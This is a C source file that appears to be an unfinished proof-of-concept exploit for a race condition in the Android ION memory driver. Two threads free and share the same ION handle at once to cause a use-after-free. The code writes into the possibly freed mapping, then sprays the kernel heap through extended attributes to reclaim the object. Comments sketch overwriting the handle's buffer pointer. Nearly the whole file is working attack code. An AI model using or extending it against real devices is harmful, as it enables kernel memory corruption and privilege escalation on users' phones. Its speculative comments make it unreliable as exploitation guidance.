#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <sys/mman.h>

/* ION definitions */
typedef int ion_user_handle_t;

struct ion_allocation_data {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    ion_user_handle_t handle;
};

struct ion_fd_data {
    ion_user_handle_t handle;
    int fd;
};

struct ion_handle_data {
    ion_user_handle_t handle;
};

#define ION_IOC_MAGIC   'I'
#define ION_IOC_ALLOC   _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE    _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_SHARE   _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)

/* Heaps to try - same as race test */
#define ION_HEAP_SYSTEM_MASK (1 << 0)
#define TARGET_HEAPS (ION_HEAP_SYSTEM_MASK)

/* Global state for the race */
int ion_fd;
ion_user_handle_t victim_handle;
pthread_barrier_t race_barrier;

/* Results */
int free_ret;
int share_ret;
int shared_fd;

/* Control */
volatile sig_atomic_t g_stop = 0;

void handle_alarm(int sig) {
    g_stop = 1;
}

#include <sys/xattr.h>
#include <sys/types.h>
#include <sys/stat.h>

void spray_heap() {
    char payload[64];
    memset(payload, 0x41, sizeof(payload)); // 'A'

    int fd = open("/data/local/tmp/spray_file", O_CREAT | O_RDWR, 0644);
    if (fd < 0) return;
    unlink("/data/local/tmp/spray_file");

    char key[32];
    for (int i = 0; i < 1000; i++) {
        snprintf(key, sizeof(key), "user.s64_%d", i);
        fsetxattr(fd, key, payload, 64, 0);
    }
    close(fd);
}

void *thread_free(void *arg) {
    struct ion_handle_data data;
    data.handle = victim_handle;

    /* Wait for the starting gun */
    pthread_barrier_wait(&race_barrier);

    /* Attempt to free the handle */
    free_ret = ioctl(ion_fd, ION_IOC_FREE, &data);

    return NULL;
}

void *thread_share(void *arg) {
    struct ion_fd_data data;
    data.handle = victim_handle;
    data.fd = -1;

    /* Wait for the starting gun */
    pthread_barrier_wait(&race_barrier);

    /* Attempt to share the handle (get an fd) */
    share_ret = ioctl(ion_fd, ION_IOC_SHARE, &data);
    shared_fd = data.fd;

    return NULL;
}

int main(int argc, char **argv) {
    unsigned long long i = 0;
    int race_wins = 0;
    struct ion_allocation_data alloc_data;
    pthread_t t1, t2;
    int duration = 30;

    if (argc > 1) {
        duration = atoi(argv[1]);
    }

    ion_fd = open("/dev/ion", O_RDWR);
    if (ion_fd < 0) {
        perror("open /dev/ion");
        return 1;
    }

    printf("[*] Starting ION FREE vs SHARE race test...\n");
    printf("[*] Duration: %d seconds\n", duration);

    signal(SIGALRM, handle_alarm);
    alarm(duration);

    while (!g_stop) {
        i++;
        /* 1. Allocate a victim handle */
        memset(&alloc_data, 0, sizeof(alloc_data));
        alloc_data.len = 4096;
        alloc_data.align = 4096;
        alloc_data.heap_id_mask = TARGET_HEAPS;
        alloc_data.flags = 0;

        if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc_data) < 0) {
            /* If allocation fails, maybe we leaked too much? Try to clean up or just fail */
            if (i % 1000 == 0) perror("ION_IOC_ALLOC failed");
            continue;
        }
        victim_handle = alloc_data.handle;

        /* 2. Reset race state */
        free_ret = -1;
        share_ret = -1;
        shared_fd = -1;
        pthread_barrier_init(&race_barrier, NULL, 2);

        /* 3. Start threads */
        pthread_create(&t1, NULL, thread_free, NULL);
        pthread_create(&t2, NULL, thread_share, NULL);

        /* 4. Wait for finish */
        pthread_join(t1, NULL);
        pthread_join(t2, NULL);
        pthread_barrier_destroy(&race_barrier);

        /* 5. Check results */
        int race_won = 0;
        
        /* The race condition we are looking for is when we get an FD back (SHARE success)
           AND the free command also succeeded (FREE success). 
           Or if SHARE succeeded, but the underlying object is gone/corrupted. */
           
        if (share_ret == 0 && shared_fd >= 0) {
            /* Share won - we got an FD */
            
            /* VERIFICATION STEP: Wait for free to complete and try to map */
            usleep(1000); /* Wait 1ms for FREE to destroy pages */

            void *map_ptr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, shared_fd, 0);
            
            if (map_ptr != MAP_FAILED) {
                /* mmap succeeded! */
                
                /* PROOF OF UAF: Try to write. If the backing store is freed, 
                   this might crash (good!) or write to reused memory (good!) */
                *(volatile char *)map_ptr = 0xAA;
                
                printf("\n[!] SUSPICIOUS: mmap succeeded on shared_fd=%d. Wrote 0xAA.\n", shared_fd);
                
                munmap(map_ptr, 4096);
                
                if (free_ret == 0) {
                     printf("[!] RACE CONFIRMED: Shared FD valid + Handle Freed!\n");
                     race_wins++;
                     
                     // Attempt to reclaim the freed object
                     spray_heap();
                     
                     // Re-map and check content
                     void *ptr = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, shared_fd, 0);
                     if (ptr != MAP_FAILED) {
                         // Check for spray pattern
                         unsigned int *uptr = (unsigned int*)ptr;
                         // Note: The pointer we get from mmap is the buffer content, NOT the handle struct.
                         // But if we corrupted the handle struct to point buffer to somewhere else...
                         // 
                         // Wait, if we overwrite ion_handle, we overwrite:
                         // - ref (kref)
                         // - client (pointer)
                         // - buffer (pointer)
                         // - node (rb_node)
                         // 
                         // If we overwrite 'buffer' pointer with 0x41414141, 
                         // then ion_mmap -> ion_buffer_mmap -> buffer->ops->map_user
                         // 
                         // We need 0x41414141 to be a valid pointer?
                         // Or we need to verify we controlled the handle.
                         
                         // For now, let's just print if mmap still works after spray.
                         printf("[+] mmap still works after spray. Checking stability...\n");
                         munmap(ptr, 4096);
                     }
                }
            } else {
                 /* mmap failed */
                 // if (i % 1000 == 0) printf("mmap failed: %s\n", strerror(errno));
            }
            
            /* Always close the leaked FD */
            close(shared_fd);
        }
        
        /* Cleanup if needed - if free failed, handle is still valid */
        if (free_ret != 0) {
             struct ion_handle_data hd = { .handle = victim_handle };
             ioctl(ion_fd, ION_IOC_FREE, &hd);
        }

        if (i % 10000 == 0) {
             /* Optional heartbeat */
        }
    }

    printf("\n[+] Finished. Total Iterations: %llu\n", i);
    printf("[+] Total Race Wins: %d\n", race_wins);
    if (i > 0) {
        printf("[+] Win Rate: %.2f%%\n", (double)race_wins / i * 100.0);
    }
    
    close(ion_fd);
    return 0;
}
